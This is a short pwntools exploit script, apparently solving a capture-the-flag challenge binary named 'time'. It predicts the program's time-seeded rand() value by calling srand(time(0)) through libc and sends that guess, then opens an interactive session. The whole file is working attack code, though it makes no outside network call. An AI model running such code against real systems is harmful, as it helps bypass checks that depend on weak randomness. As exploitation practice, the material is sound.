from pwn import *
import sys
from LibcSearcher import LibcSearcher

#MyTemplate
program = 'time'
elf = ELF(program,checksec=False)
lokal = True
#context.arch = ''

s    = lambda data               :xp.send(data)
sa   = lambda delim,data         :xp.sendafter(delim,data)
sl   = lambda data               :xp.sendline(data)
sla  = lambda delim,data         :xp.sendlineafter(delim,data)
r    = lambda numb=4096          :xp.recv(numb)
ru   = lambda delims, drop=True  :xp.recvuntil(delims, drop)
uu64 = lambda x                  :u64(x.ljust(8,"\x00"))
uu32 = lambda x                  :u32(x.ljust(4,"\x00"))

if len(sys.argv) > 1:
	Debug = True
else:
	Debug = False


if lokal:
    xp = elf.process()
    #libc = elf.libc
else:
    host = ''
    port = ''
    xp = remote(host,port)
    #libc = ELF("givenlibc",checksec=False)

if Debug:
    #context.log_level='debug'
    context.terminal = ["tmux","splitw","-h"]
    cmd = ""
    gdb.attach(xp,cmd)

#Exploit Here
import ctypes
LIBC = ctypes.cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
LIBC.srand(LIBC.time(0))
addr = LIBC.rand()
print addr
sl(str(addr))


xp.interactive()
